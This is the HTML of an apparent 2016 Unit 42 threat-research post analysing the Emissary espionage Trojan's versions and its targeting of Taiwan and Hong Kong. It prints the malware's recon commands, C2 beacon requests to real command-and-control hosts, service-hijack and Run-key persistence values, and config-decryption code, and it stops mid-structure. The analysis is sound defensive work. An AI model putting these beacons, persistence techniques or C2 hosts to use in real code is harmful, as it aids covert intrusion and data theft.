<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">
    <link rel="preconnect" href="https://www.paloaltonetworks.com">
    <link rel="preconnect" href="https://cdn.cookielaw.org">
    <link rel="preconnect" href="https://fonts.googleapis.com">
	    <!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
var main_site_url = 'https://www.paloaltonetworks.com';
var maindomain_lang = 'https://www.paloaltonetworks.com';
function getParameterByName(name, url) {
		if(url == null){
		  url = window.location.href;
		}
	    name = name.replace(/[\[\]]/g, '\\$&');
	    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
		results = regex.exec(url);
	    if (!results) return null;
	    if (!results[2]) return '';
	    return decodeURIComponent(results[2].replace(/\+/g, ' '));
	}
	var container_q = getParameterByName('container');
	var d_lang = 'en';	
	if(container_q != '' && container_q != null){	    
	    sessionStorage.setItem('container',container_q);
	    	    location.href = 'https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve';
	}
</script>

<link rel="preload" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTop.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTop.min.css"></noscript>
<link rel="preload" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopProductNav.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopProductNav.min.css"></noscript>
<link rel="preload" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/deferedProductNav.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/deferedProductNav.min.css"></noscript>
  <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/" />
<link rel="alternate" hreflang="x-default" href="https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/" />

	<!-- This site is optimized with the Yoast SEO Premium plugin v23.1 (Yoast SEO v23.1) - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve?</title>
	<meta name="description" content="Palo Alto Networks Unit 42 examines Emissary Trojan and how it is related to Operation Lotus Blossom." />
	<link rel="canonical" href="https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve?" />
	<meta property="og:description" content="Palo Alto Networks Unit 42 examines Emissary Trojan and how it is related to Operation Lotus Blossom." />
	<meta property="og:url" content="https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/" />
	<meta property="og:site_name" content="Unit 42" />
	<meta property="article:published_time" content="2016-02-03T09:00:44+00:00" />
	<meta property="article:modified_time" content="2018-11-01T10:04:05+00:00" />
	<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/02/Emissary-1-1.jpg" />
	<meta name="author" content="Robert Falcone, Jen Miller-Osborn" />
	<meta name="twitter:card" content="summary_large_image" />
	<!-- / Yoast SEO Premium plugin. -->


<link rel="alternate" type="application/rss+xml" title="Unit 42 &raquo; Feed" href="https://unit42.paloaltonetworks.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Unit 42 &raquo; Comments Feed" href="https://unit42.paloaltonetworks.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Unit 42 &raquo; Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve? Comments Feed" href="https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/feed/" />
<script type="text/javascript">
var globalConfig = {};
var webData = {};
webData.channel = "unit42";
webData.property = "unit42.paloaltonetworks.com";
webData.language = "en_us";
webData.pageType = "blogs";
webData.pageName = "unit42:emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve";
webData.pageURL = "https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve";
webData.article_title = "Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve?";
webData.author = "Robert Falcone,Jen Miller-Osborn";
webData.published_time = "2016-02-03T11:00:44-08:00";
webData.description = "Palo Alto Networks Unit 42 examines Emissary Trojan and how it is related to Operation Lotus Blossom.";
webData.keywords = "Malware,Threat Research,cyber espionage,cybersecurity,Elise,Emissary,Espionage,Lotus Blossom,Trojans";
webData.resourceAssetID = "0ddeab242a16b7b3562fcbe17908b20d";
</script>
<script type="text/javascript">
var globalConfig = {};
globalConfig.buildName = "UniqueResourceAssetsID_DEC022022";
</script>
<meta property="og:likes" content="2"/>
<meta property="og:readtime" content="18"/>
<meta property="og:views" content="53,655"/>
<meta property="og:date_created" content="February 3, 2016 at 11:00 AM"/>
<meta property="og:post_length" content="6381"/>
<meta property="og:category" content="Malware"/>
<meta property="og:category" content="Threat Research"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/malware/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/threat-research/"/>
<meta property="og:author" content="Robert Falcone"/>
<meta property="og:author" content="Jen Miller-Osborn"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/robertfalcone/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/jen-miller-osborn/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta name="post_tags" content="cyber espionage,cybersecurity,Elise,Emissary,Espionage,Lotus Blossom,Trojans"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve?","name":"Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve?","description":"In December 2015, Unit 42 published a blog about a cyber espionage attack using the Emissary Trojan as a payload. Emissary is related to the Elise Trojan and the Operation Lotus Blossom attack campaign, which prompted us to start collecting additional samples of Emissary. The oldest sample we found was created in 2009, indicating this","url":"https:\/\/unit42.paloaltonetworks.com\/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve\/","datePublished":"February 3, 2016","articleBody":"In December 2015, Unit 42 published a blog about a cyber espionage attack using the Emissary Trojan as a payload. Emissary is related to the Elise Trojan and the Operation Lotus Blossom attack campaign, which prompted us to start collecting additional samples of Emissary.\r\n\r\nThe oldest sample we found was created in 2009, indicating this tool has been in use for almost seven years. Of note, this is three years earlier than the oldest Elise sample we have found, suggesting this group has been active longer than previously documented. In addition, Emissary appears to only be used against Taiwanese or Hong Kong based targets, all of the decoys are written in Traditional Chinese, and they use themes related to the government or military.\r\n\r\n\r\n\r\nWe also found several different versions of Emissary that had several iterative changes that show how the Trojan evolved over the years. One of the most interesting observations made during this analysis is that the amount of development effort devoted to Emissary significantly increased after we published our Operation Lotus Blossom report in June 2015, resulting in many new versions of the Emissary Trojan. In addition, we observed a TTP shift post publication with regards to their malware delivery; they started using compromised but legitimate domains to serve their malware. Interestingly, the C2 infrastructure is also somewhat different than that used by Elise.\r\nTargeting\r\nIn contrast to Elise, which was used in attacks against multiple Southeast Asian countries in region appropriate languages, all of the Emissary decoys we\u2019ve collected are written in Traditional Chinese, which is used primarily in Taiwan and Hong Kong. The targets we have identified are also limited to those two regions. Despite appearing to target a more limited geographical range, Emissary targeted the government, higher education, and high tech companies with a mix of copy and pasted news articles and documents that do not appear to be available online. Decoys include:\r\n\r\n\tAn Excel spreadsheet containing legitimate contact information for much of the Taiwanese government that does not appear to be available online.\r\n\tCopy and paste of a news article where the Deputy Commander of the Nanjing Military region, Wang Huanguang, responds negatively to a 2014 magazine article from a respected US Taiwan scholar saying the odds of China and Taiwan reuniting is low and discussing the issues with an attempted military takeover.\r\n\tCopy of a news article from 2010 about the Chinese League of Victims protesting the involuntary removal of Shanghai residents in the lead up to the Shanghai Expo.\r\n\tCopy of the official Taiwan holiday schedule for 2016, which is the 105th anniversary of the current Taiwanese government.\r\n\r\n\r\nFigure 1: Partial screenshot of the response from Deputy Commander of the Nanjing Military Region Wang Huangguang.\r\n\r\nEvolve to Survive: TTP Shifts and Infrastructure\r\nWe\u2019ve expanded our knowledge of Emissary infrastructure significantly since our first Emissary blog and we\u2019ve found almost exclusive use of Dynamic DNS (DDNS) domains with only one purchased from a Chinese reseller. In contrast, the Elise samples used a mix of actor-registered and DDNS, with the actor-registered serving as one of the data points we used to tie all of the activity together. While the use of DDNS can make tying activity together more difficult, and despite the new Emissary variants since our publication, two of the most recent C2s resolved to IPs used by Elise C2s detailed in Operation Lotus Blossom. The Emissary samples typically have three hardcoded C2s that are a mix of IPs and domain names, with one of the domains or IPs not being used by the other three C2s in a likely effort to avoid loss of control. A full IOC list is included at the end of this report.\r\n\r\nAlso new is the actors\u2019 use of compromised legitimate Taiwanese websites to serve their malware, including the official website of the Democratic Progressive Party. This is particularly interesting as Taiwan just held a closely watched Presidential election on 16 January where DPP candidate Tsai Ing-wen won. This marked the first time a woman was elected President of Taiwan and only the second time a member of the Kuomintang did not hold the office since being ousted from China in 1949 when the Communist Party of China took power. In line with her party\u2019s stance, she is widely seen as a proponent of an independent Taiwan and not in favor of reunification with the People\u2019s Republic of China.\r\nMalware Updates\r\nOur evidence suggests that malware authors created Emissary as early as 2009, which suggests that threat actors have relied on this tool as a payload in cyber-espionage attacks for many years. The Emissary Trojan is a capable tool to gain a foothold on a targeted system. While it lacks more advanced functionality like screen capturing, it is still able to carry out most tasks desired by threat actors: exfiltration of files, ability to download and execute additional payloads, and gain remote shell access. It appears that threat actors have continually used this Trojan, and developed several updated versions of Emissary to remain undetected and fresh over time.\r\n\r\nWe analyzed all of the known Emissary samples to determine what changes the malware author made between the different versions of the Trojan. During our analysis, we examined when each sample was created based on its compile time and produced a simple timeline, seen in Figure 2, to display the development efforts expended on the Emissary Trojan. It should be noted that we know some Emissary samples have been used multiple times with different configurations, so the timeline only shows when development activity took place on Emissary and should not be misconstrued to when Emissary was used in attacks.\r\n\r\nThe timeline in Figure 2 shows that the Emissary Trojan was first created (version 1.0) in May 2009 and quickly received an update that resulted in version 1.1 in June 2009. The Trojan did not receive much in the form of updates until September 2011 when the author released version 2.0. Version 2.0 received one update in October 2013 before the malware author released version 3.0 in December 2014. The malware author released version 4.0 in March 2015, but curiously created a version 3.0 sample afterwards on June 26, 2015, which was out-of-sequence from the incrementing versioning. Between August and November 2015 the malware author creates several new versions of Emissary, specifically 5.0, 5.1, 5.3 and 5.4 in a much more rapid succession compared to development process in earlier versions.\r\n\r\n\r\nFigure 2: Timeline of development efforts spent on Emissary\r\nThe out-of-sequence version 3.0 appears to be an early variant of version 5.0 based on significant similarities (discussed in the changelog section) that are not seen in the original version 3.0 and other earlier versions of Emissary. One campaign code associated with of the out-of-sequence version 3.0 sample was \u201c3test\u201d, suggesting the malware author created it for testing purposes. The other campaign code associated with the out-of-sequence sample was \u201cIC00001\u201d, which could denote an attack payload as it appears to be a plausible code to describe a campaign.\r\n\r\nWhile this may be coincidental, the out-of-sequence version 3.0 sample was created ten days after we published the Operation Lotus Blossom paper that exposed the Elise Trojan that is closely related to Emissary. It is possible that the threat actors were prompted to make malware changes in response to our research. Regardless of causation, the rapid development of new versions of Emissary suggests that the malware authors are making frequent modifications to evade detection, which as a corollary suggests the threat actors are actively using the Emissary Trojan as a payload in attacks.\r\nEmissary Changelog\r\nIn this section, we discuss the changes observed between each version of Emissary. As this section is focused on changes, the features and functionality are the same between Emissary versions unless otherwise mentioned.\r\nVersion 1.0\r\nDate: 5\/12\/2009\r\n\r\nSHA256: a7d07b92e48876e2195e5d8769a47cf0a237e11ac304e41b14fc36042b0d9484 Original Name: WUMsvc.dll\r\n\r\nInitial Release\r\n\r\nThe initial loader Trojan writes Emissary to %SYSTEM%\\WSPsvc.dll and installs it as a service, which will run the exported function \"ServiceMain\" within the Emissary Trojan to carry out its functionality.\r\n\r\nConfiguration data is stored in the last 1024 bytes of the payload, from which the Trojan will extract an 896 byte structure. The configuration is decrypted with an algorithm that uses the XOR operation on each byte using the value at a different offset within the ciphertext.\r\n\r\nThe code will create the following registry keys:\r\nHKEY_CLASSES_ROOT\\Shell.LocalServer\\CheckCode\r\nHKEY_CLASSES_ROOT\\Shell.LocalServer\\CheckID\r\n\r\nEmissary uses the \"CheckCode\" registry key to store the encrypted configuration for the Trojan, while it stores a GUID that Emissary uses to uniquely identify the compromised host in the \"CheckID\" key.\r\n\r\nThe malware performs initial system information gathering and saves data to a file named TMP2548. The initial gathering relies on a combination of the following commands executed by the command prompt:\r\ncommands executed by the command prompt:\r\n\r\nECHO VER\r\nVER\r\nECHO IPCONFIG \/ALL\r\nIPCONFIG \/ALL\r\nECHO NET LOCALGROUP ADMINISTRATORS\r\nNET LOCALGROUP ADMINISTRATORS\r\nECHO NET START\r\nNET START\r\nECHO GPRESULT \/Z\r\nGPRESULT \/Z\r\nECHO GPRESULT                  \/SCOPE COMPUTER \/Z\r\nGPRESULT                     \/SCOPE COMPUTER \/Z\r\nECHO SYSTEMINFO\r\nSYSTEMINFO\r\n\r\nEmissary parses command and control responses for \"instru\", which will precede a GUID value that designates the command the C2 server wishes to execute on the system. The command handler does not use a nested if\/else or switch statement like most malware families, instead Emissary creates a structure that contains all of the available command GUIDs that it will iterate through each time the C2 supplies a GUID in order to determine which command the operator wishes to execute. Emissary can include up to 32 different commands within this data structure, but it appears the author has decided to include six commands within the Trojan. The following denotes the command handler structure used by Emissary v1.0:\r\nstruct EMISSARY_COMMAND\r\n{\r\n  CHAR guid[40];\r\n  DWORD sub_function;\r\n  DWORD arg1_subfunction;\r\n  DWORD arg2_subfunction;\r\n  DWORD arg3_subfunction;\r\n};\r\n\r\nstruct commandHandler \r\n{\r\n  DWORD number_of_commands;\r\n  DWORD unused;\r\n  struct EMISSARY_COMMAND cmd_0;\r\n  struct EMISSARY_COMMAND cmd_1;\r\n  struct EMISSARY_COMMAND cmd_2;\r\n  struct EMISSARY_COMMAND cmd_3;\r\n  struct EMISSARY_COMMAND cmd_4;\r\n  struct EMISSARY_COMMAND cmd_5;\r\n};\r\nTable 1 contains the commands available within the Emissary v1.0 command handler.\r\n\r\n\r\n\r\n\r\nCommand\r\nDescription\r\n\r\n\r\nbac84b12-5b0b-491f-a885-8667d156394f\r\nUpload file.\r\n\r\n\r\n3d8313cc-53ca-4751-bbbf-ea5f914f8e65\r\nDownload file.\r\n\r\n\r\ndb0e93e7-b46c-4cba-81f1-ec70da57dc19\r\nUpdate config. C2 specifies files as: p1 = C2 server 1, p2 = C2 server 2, p3 = C2 server 3, p4 = Sleep Interval, p5 = System Identifier (computer name), p6 = GUID for beacon.\r\n\r\n\r\n2e382e51-3089-4293-8454-5eccb253eb54\r\nExecutes a specified command.\r\n\r\n\r\na57db08a-bf97-4b43-b27d-157e62e2fd74\r\nCreate remote shell.\r\n\r\n\r\neab5c1ab-a497-4fc2-bbe0-049be45d6f2d\r\nUpdate Trojan with new executable.\r\n\r\n\r\n\r\nTable 1: Emissary command handler\r\nThe Emissary version 1.0 beacon to the C2 server appears as follows:\r\nGET \/VSNET\/default.aspx HTTP\/1.1\r\nUser-Agent: Mozilla\/4.0\r\nHost: 193.34.144[.]21\r\nCookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6\r\n\r\nDate: 5\/31\/2009\r\n\r\nSHA256: e6c4611b1399ada920730686395d6fc1700fc39add3d0d40b4f784ccb6ad0c30, Original Name: WUMsvc.dll\r\n\r\nRemoved checks for \"\/\/\" and \"\/\" in the update configuration command when updating the three C2 servers.\r\nVersion 1.1\r\nDate: 6\/5\/2009\r\n\r\nSHA256: 931a1284b11a3997c7a99076d582ed3436aa30409dc73bd763436dddd490f9cb\r\n\r\nOriginal Name: WUMsvc.dll\r\n\r\nBug fixes:\r\n\r\n\tAdded code to make sure the content received from the C2 server matches the \"Content-Length\" value in the HTTP response.\r\n\tCode added to allow for the download of more than 524,288 bytes.\r\n\r\nThe Emissary v1.1 C2 beacon appears as follows, which has not changed since version 1.0:\r\nGET \/eng\/comfunc\/comfunc\/default.aspx HTTP\/1.1\r\nUser-Agent: Mozilla\/4.0\r\nHost: 137.189.145.1\r\nCookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6\r\n\r\nVersion 2.0\r\nDate: 9\/15\/2011\r\n\r\nSHA256: 5edf2d0270f8e7eb5be3476802e46c578c4afc4b046411be0806b9acc3bfa099 Original Name: EmissaryDll.dll\r\n\r\nVersion 2.0 was a significant re-write of the Emissary Trojan.\r\n\r\nThe configuration data for the Trojan is still saved to the registry, but the registry key has changed to:\r\nSOFTWARE\\Microsoft\\VBA\\VbaData\r\nThe configuration structure also changed in size to 464 bytes. The Emissary configuration is now encrypted using a custom algorithm that uses the \"srand\" function to seed the \"rand\" function using a value of 2563. This seed value causes the \"rand\" function to generate the same values each time, which Emissary will use as a key along with the XOR operation. The configuration now contains the version number of Emissary, instead of the version being hardcoded into the Trojan.\r\n\r\nThis version of Emissary keeps track of which C2 location within its configuration that it has been communicating with by storing the index of the C2 server (1, 2, or 3) in the following registry key:\r\nSOFTWARE\\Microsoft\\VBA\\VbaList\r\nThis version of Emissary moves away from the command handler using the structure and moves to a nested if\/else statement for less complicated command handling; however, the command GUID and commands themselves are unchanged.\r\n\r\nThe Emissary version 2.0 beacon changed slightly from previous versions, specifically the removal of the User-Agent field and the use of a lowercase \"h\" in the \"Host\" field. The following is an example of the version 2.0 beacon, which contains the same GUID and \"op\" values:\r\nGET \/0test\/test\/default.aspx HTTP\/1.1\r\nhost: 163.20.127.27\r\nCookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6;\r\n\r\nVersion 2.0 also introduces a debug message logging system that includes verbose error messages that are accompanied by an error ID number. Error messages are written to the file %TEMP%\\em.log. The following is a list of all possible debug messages:\r\nSource - Error ID - Debug Message\r\nemissarydll.cpp - 0x30 - InitApp() - Event already exists\r\nemissarydll.cpp - 0x35 - InitApp() - Event create successful\r\nemissarydll.cpp - 0x3b - InitApp() - create work thread\r\nshell.cpp - 0x30 - SendShellOutputThread - PeekNamedPipe - Error : 0x%08x\r\nshell.cpp - 0x3e - SendShellOutputThread() : Timeout\r\nshell.cpp - 0x53 - SendShellOutputThread - ReadFile - Error : 0x%08x\r\nshell.cpp - 0x5b - SendShellOutputThread - send - Error : 0x%08x\r\nshell.cpp - 0x62 - SendShellOutputThread() : thread exit\r\nshell.cpp - 0x7f - RecvShellCmdThread - recv - Error : 0x%08x\r\nshell.cpp - 0x89 - RecvShellCmdThread - WriteFile - Error : 0x%08x\r\nshell.cpp - 0x8f - RecvShellCmdThread() : thread exit\r\nshell.cpp - 0xeb - Error occured : %s [%d]\r\nshell.cpp - 0xfa - TerminateThread Input Thread\r\nshell.cpp - 0x100 - TerminateThread Output Thread\r\nshell.cpp - 0x118 - SocketShell - Fail To Create Reverse Socket\r\nshell.cpp - 0x12f - SocketShell - Fail To  Generate Reverse Shell\r\nshell.cpp - 0x13a - SocketShell - SocketShell - Fail To  Generate Reverse Shell\r\nshell.cpp - 0x13e - SocketShell - Create Reverse Shell Thread OK\r\nconfig.cpp - 0x38 - RegCreateKeyEx error : %0x08x\r\nconfig.cpp - 0x46 - RegSetValueEx error : %0x08x\r\nconfig.cpp - 0x5e - ReadConfig - RegCreateKeyEx error : 0x%08x\r\nconfig.cpp - 0x66 - ReadConfig - RegQueryValueEx error : 0x%08x\r\nconfig.cpp - 0xab - find user: %s\r\nconfig.cpp - 0xbc - can not find proxy\r\nconfig.cpp - 0xc7 - get ProxySetting failed\r\nconfig.cpp - 0xd4 - find proxy server : %s\r\nrun.cpp -      0x75 - InitConfig: [g_ServerPath:%s] [g_ServerName:%s] [g_port:%d] [g_ServerUrl:%s]\r\nrun.cpp - 0x9d - InitConfig: [g_DelayTime:%d]\r\nrun.cpp - 0xbe - get proxy the last time used:%s\r\nrun.cpp - 0xc3 - server index:%d\r\nrun.cpp - 0xd9 - RetryTimes = %d\r\nrun.cpp - 0xec - connect %s error :%s\r\nrun.cpp - 0x10c - process a request ok.\r\nhttpclient.cpp - 0x98 - ASP.NET_SessionId\u957f\u5ea6\u5f02\u5e38:[%d][%s] (translation: ASP.NET_SessionId Length Exception:[%d][%s])\r\nhttpclient.cpp - 0xd0 - ******not connected !\r\nhttpclient.cpp - 0xf4 - read hread error : %s\r\nhttpclient.cpp - 0x102 - body length = 0\r\nhttpclient.cpp - 0x13d - decrypt error\"\r\nhttpclient.cpp - 0x211 - instruction : &lt;instruction&gt;\r\nhttpclient.cpp - 0x21d - no instruction guid\r\nhttpclient.cpp - 0x22c - OP_DOWNLOAD no local file name\r\nhttpclient.cpp - 0x23b - OP_UPLoad no local file name\r\nhttpclient.cpp - 0x249 - OP_UPLoad no local file name\r\nhttpclient.cpp - 0x242 - OP_UPLoad no local file name\r\nhttpclient.cpp - 0x25b - OP_EXECUTE no cmd list\r\nhttpclient.cpp - 0x262 - OP_EXECUTE no timeout\r\nhttpclient.cpp - 0x2b4 - OP_SHELL ip\r\nhttpclient.cpp - 0x2bb - OP_SHELL port\r\nhttpclient.cpp - 0x2dd - OP_CHANGECONFIG server1\r\nhttpclient.cpp - 0x2e4 - OP_CHANGECONFIG server2\r\nhttpclient.cpp - 0x2eb - OP_CHANGECONFIG server3\r\nhttpclient.cpp - 0x2f2 - OP_CHANGECONFIG timestr\r\nhttpclient.cpp - 0x2f9 - OP_CHANGECONFIG namestr\r\nhttpclient.cpp - 0x300 - OP_CHANGECONFIG guid\r\nhttpclient.cpp - 0x321 - not connected\r\nhttpclient.cpp - 0x361 - send msg error\r\nhttpdoinstruction.cpp - 0x28 - DownloadFile - LocalFileName=%s\r\nhttpdoinstruction.cpp - 0x5c - download file http head:%s\r\nhttpdoinstruction.cpp - 0x7a - download file ok\r\nhttpdoinstruction.cpp - 0xac - UploadFile - LocalFileName=%s\r\nhttpdoinstruction.cpp - 0xb4 - DownloadFile - Error - Open File [%S][0x%08x]\r\nhttpdoinstruction.cpp - 0xc7 - UploadFile:TotalLength=%d\r\nhttpdoinstruction.cpp - 0x124 - download file http head:%s\r\n\r\nDate: 10\/24\/2013\r\n\r\nSHA256: 9dab2d1b16eb0fb4ec2095d4b4e2a3ad67a707ab4f54f9c26539619691f103f3\r\n\r\nOriginal Name: NetPigeon_DLL.dll\r\n\r\nThis update to Emissary allowed the Trojan to run as a service. The configuration now contains settings for the Emissary service, which the Trojan will store in and access from the following registry keys:\r\n\r\nSOFTWARE\\Microsoft\\VBA\\Serv -&gt; Service Name\r\n\r\nSOFTWARE\\Microsoft\\VBA\\VbaList -&gt; Binary Path for the Service\r\n\r\nAlso, this version of Emissary was created using Microsoft Foundation Classes (MFC) to carry out a majority of its functionality. For instance, instead of manually building an HTTP request as in previous versions, this version uses the MFC functions to create the HTTP request and send it to the C2 server:\r\n\r\n\tCInternetSession::CInternetSession\r\n\tCInternetSession::GetHttpConnection\r\n\tCHttpConnection::OpenRequest\r\n\tCHttpFile::AddRequestHeaders\r\n\tCInternetSession::SetCookie\r\n\tCHttpFile::SendRequest\r\n\r\nUsing these classes creates a significantly different HTTP request sent to the C2 server, but the functionality of obtaining instructions from the C2 is the same. The following is an example of a beacon generated by this sample, which contains the same \"op\" value and has additional fields within the HTTP header:\r\nGET \/lightserver\/Default.aspx HTTP\/1.0\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla\/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\nHost: groupspace.findhere.org\r\nCookie: guid=8E550BBD-F5DB-4471-BBC7-E8768BD5003E; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6\r\n\r\nThe logging functionality within this update no longer includes error ID values, but still contains verbose debug messages that are written to a file named %TEMP%\\msmqinst.ax.\r\nVersion 3.0\r\nDate: 12\/24\/2014\r\n\r\nSHA256: dcbeca8c92d6d18f2faf385e677913dc8abac3fa3303c1f5cfe166180cffbed3\r\n\r\nOriginal Name: Generic.dll\r\n\r\nBug fixes:\r\n\r\n\tAdded a function to the configuration update command that checks to see if the C2 provided a new sleep interval at offset 460 and uses the interval stored in the VbaData registry key if its missing. This fixes the bug that would not allow the sleep interval to update correctly.\r\n\r\nVersion 4.0\r\nDate: 3\/26\/2015\r\n\r\nSHA256: 5171c9a593389011da4d72125e52bf7ef86b2da7fcd6c2a2bc95467afe6a1b58\r\n\r\nOriginal Name: Generic.dll\r\n\r\nThis version of Emissary includes both the installation and loading functionality along with the Emissary functional code in the same file. The installation and loading portion of the Trojan is called using an exported function named \"Setting\", which moves the file to:\r\n%TEMP%\\Remdisk.dll\r\nThe loading portion of this version of Emissary checks the permissions of the current user and either installs Emissary as a service or as a standalone Trojan. To install as a service, the loader will enumerate the services on the system looking for services running under the \"netsvcs\" group, and it will attempt to hijack the first \"netsvcs\" service by replacing the \"ServiceDLL\" parameter to point to the Emissary DLL. For instance, during the analysis period, the installation code changed the following registry key of the AppMgmt:\r\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\AppMgmt\\Parameters\\ServiceDll: \"%SystemRoot%\\System32\\appmgmts.dll\"\r\nto\r\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\AppMgmt\\Parameters\\ServiceDll: \"C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\Remdisk.dll\"\r\nIf the user does not have permissions to add a service, the installation routine attempts to add persistence by creating the following registry key that will run the functional code within Emissary via an exported function named \"DllRegister\":\r\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run\\Resolves: \"Rundll32.exe C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\Remdisk.dll,DllRegister\"\r\nThis version of emissary has its configuration appended to the end of the DLL, specifically starting at offset 0xc600. The following code accesses the configuration embedded within the DLL and decrypts it using a single byte XOR algorithm using 65 as the key:\r\nSetFilePointer(v2, 0xC600, 0, 0);\r\nReadFile(h_emissary_dll_file, buffer_for_config, 0x1D0u, &amp;NumberOfBytesRead, 0);\r\niteration_count = 0;\r\ndo\r\n  *(iteration_count++ + buffer_for_config) += 65;\r\nwhile ( iteration_count &lt; 0x1D0 );\r\n\r\nThis algorithm differs from the algorithm introduced in Emissary version 2.0 that used the srand and rand functions to generate a key to use in conjunction with the XOR operation. With the configuration embedded within the Emissary DLL, each Emissary version 4.0 sample will have a different hash as the configuration data changes.\r\n\r\nThe network beacon sent from Emissary version 4.0 is the same as other previous versions starting at version 2.0, as seen in the following:\r\nGET \/lightserver\/Default.aspx HTTP\/1.0\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla\/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\nHost: 210.209.121.92\r\nCookie: guid=7DA53AE4-C155-40b3-8EB3-60C4FCE99025; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6\r\n\r\nVersion 3.0: Out-of-sequence\r\nDate: 6\/25\/2015\r\n\r\nSHA256: 70bed57bc3484fe5dbcf3c732bd7b11f80a742138f4733bc7e9b6d03e721da4a\r\n\r\nOriginal Name: IISDLL.dll\r\n\r\nMajor Overhaul\r\n\r\nThe compilation time of one sample of Emissary version 3.0 on June 25, 2015 appears out of order, as it occurs after the compilation of Emissary version 4.0. The differences between this out of order sample compared to the other known version 3.0 sample, as well as version 4.0 for that matter, include a dramatic change in configuration storage and the handling of commands. Also, the files stored on the system have different names than Emissary versions in the past, which are:\r\n%TEMP%\\000IISA758C8FEAE5F.TMP -&gt; Log file\r\n%APPDATA%\\LocalData\\75BD50EC.DAT -&gt; Configuration file\r\n%APPDATA%\\LocalData\\A08E81B411.DAT -&gt; Emissary DLL\r\n\r\nThis version of Emissary is designed to be injected into an Internet Explorer process by its associated loader Trojan, which marks the first time Emissary executes through DLL injection.\r\n\r\nThis version of Emissary also has a different configuration structure than prior versions. The configuration is no longer stored in the registry; rather it is saved to a file named 75BD50EC.DAT. The Emissary DLL will skip to offset 0x488 within this file and read the next 132 bytes, which it will decrypt with a new algorithm as seen in the following:\r\nSetFilePointer(h_config_file_1, 0x488, 0, 0);\r\nReadFile(h_config_file, buffer_for_config, 132u, &amp;NumberOfBytesRead, 0);\r\nCloseHandle(h_config_file);\r\nsrand(0xA03u);\r\niteration_count = 0;\r\ndo\r\n  *(buffer_for_config + iteration_count++) ^= rand() % 128;\r\nwhile ( iteration_count &lt; 0x84 );\r\n\r\nThe configuration structure has also changed as well, with Emissary now using the following structure:\r\nstruct emissary_new_config {\r\nWORD 